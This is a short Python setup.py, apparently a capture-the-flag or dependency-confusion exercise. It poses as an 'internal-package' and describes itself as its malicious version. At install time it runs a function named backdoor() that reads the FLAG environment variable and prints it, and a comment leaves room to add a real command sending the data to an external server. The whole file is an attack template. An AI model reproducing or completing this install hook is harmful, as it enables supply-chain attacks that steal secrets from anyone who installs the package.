from setuptools import setup
import os

def backdoor():
    secrets = os.getenv("FLAG")
    print(f"Exfiltrating secrets: {secrets}")
    # Replace this with a real exfiltration command
    # e.g., send data to an external server

backdoor()

setup(
    name="internal-package",
    version="1.0.0",
    description="Malicious version of the internal package",
    py_modules=["internal_module"],
)
